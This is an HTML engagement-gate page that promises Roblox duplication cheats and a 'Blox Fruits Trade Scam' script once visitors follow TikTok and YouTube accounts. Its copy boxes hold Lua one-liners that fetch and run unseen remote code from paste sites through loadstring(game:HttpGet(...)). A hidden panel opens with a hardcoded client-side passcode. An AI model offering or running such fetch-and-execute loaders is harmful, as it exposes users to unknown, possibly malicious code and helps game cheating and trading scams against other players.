<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Unlock Dupe</title>

<style>
body {
  margin: 0;
  min-height: 100vh;
  background: linear-gradient(180deg,#0b1220,#050814);
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #fff;
}

.card {
  width: 90%;
  max-width: 400px;
  background: #111a2e;
  border-radius: 16px;
  padding: 22px;
  box-shadow: 0 20px 40px rgba(0,0,0,.6);
}

.title {
  text-align: center;
  font-size: 24px;
  font-weight: bold;
  color: #4fd1ff;
}

.subtitle {
  text-align: center;
  font-size: 14px;
  opacity: .85;
  margin: 8px 0 18px;
}

.task {
  width: 100%;
  border: none;
  padding: 14px;
  margin: 7px 0;
  border-radius: 10px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  color: #fff;
}

.tiktok { background:#3b82f6; }
.youtube { background:#f59e0b; }
.like { background:#22c55e; }
.comment { background:#ec4899; }
.watch { background:#ef4444; }
.toggle { background:#6366f1; margin-top:10px; }
.dev-btn { background:#0ea5e9; margin-top:10px; }

.progress {
  background: #1e293b;
  border-radius: 10px;
  height: 12px;
  margin-top: 16px;
  overflow: hidden;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg,#4fd1ff,#38bdf8);
  transition: width .3s;
}

.percent {
  text-align: center;
  font-size: 13px;
  margin-top: 6px;
}

.scripts, .dev-panel {
  display: none;
  margin-top: 20px;
}

.script-box {
  background: #0b1220;
  border-radius: 12px;
  padding: 12px;
  margin-bottom: 12px;
}

.script-title {
  font-weight: bold;
  margin-bottom: 6px;
}

textarea {
  width: 100%;
  height: 70px;
  background:#020617;
  color:#38bdf8;
  border:none;
  border-radius:8px;
  padding:8px;
  resize:none;
  font-family: monospace;
  font-size: 12px;
}

.copy {
  width: 100%;
  border: none;
  padding: 10px;
  border-radius: 8px;
  background: #4fd1ff;
  color: #000;
  font-weight: bold;
  cursor: pointer;
  margin-top: 6px;
}

.dev-panel-header {
  display:flex;
  justify-content: space-between;
  align-items:center;
  margin-bottom: 10px;
}

.dev-close {
  cursor:pointer;
  font-size:18px;
  color:#f87171;
}
</style>
</head>

<body>

<div class="card">
  <div class="title">🔑 Steal A Brainrot Dupe</div>
  <div class="subtitle">Complete all steps to unlock</div>

  <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
  <button class="task youtube" onclick="step(this,ytLink)">🔔 Subscribe</button>
  <button class="task like" onclick="step(this,ytLink)">👍 Like</button>
  <button class="task comment" onclick="step(this,ytLink)">💬 Comment</button>
  <button class="task watch" onclick="step(this,ytLink)">▶️ Watch</button>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>
  <div class="percent" id="percent">0%</div>

  <button class="task toggle" onclick="togglePage()" id="toggleBtn">
    Blox Fruits Trade Scam
  </button>

  <button class="task dev-btn" onclick="openDev()">Show All Scripts (Dev)</button>

  <!-- UNLOCKED DUPE SCRIPTS -->
  <div class="scripts" id="scripts">
    <div class="script-box">
      <div class="script-title">Dupe Script 1</div>
      <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 2</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 3</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>
  </div>

  <!-- DEV PANEL (ALL 4 SCRIPTS) -->
  <div class="dev-panel" id="devPanel">
    <div class="dev-panel-header">
      <div>Dev Scripts</div>
      <div class="dev-close" onclick="closeDev()">×</div>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 1</div>
      <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 2</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Dupe Script 3</div>
      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Blox Fruits Trade Scam</div>
      <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/tdmn5CXvSCxTbnip/raw", true))()</textarea>
      <button class="copy" onclick="copy(this.previousElementSibling.value)">Copy</button>
    </div>
  </div>
</div>

<script>
let done = 0;
const total = 5;
let ytLink = "https://youtu.be/Oc9vLLmABqs";

function step(btn, link) {
  if (btn.dataset.done) return;
  btn.dataset.done = true;
  btn.style.opacity = .6;
  done++;
  update();
  window.open(link, "_blank");
}

function update() {
  let percent = Math.floor((done / total) * 100);
  bar.style.width = percent + "%";
  percentEl.innerText = percent + "%";
  if (percent === 100) scripts.style.display = "block";
}

function togglePage() {
  resetProgress();
  ytLink = "https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M";
}

function resetProgress() {
  done = 0;
  bar.style.width = "0%";
  percentEl.innerText = "0%";
  scripts.style.display = "none";
  document.querySelectorAll(".task").forEach(b => {
    delete b.dataset.done;
    b.style.opacity = 1;
  });
}

function openDev() {
  const code = prompt("Enter Dev Code");
  if (code === "NinjaBlender223") devPanel.style.display = "block";
}

function closeDev() {
  devPanel.style.display = "none";
}

function copy(text) {
  navigator.clipboard.writeText(text);
  alert("Copied!");
}
</script>

</body>
</html>
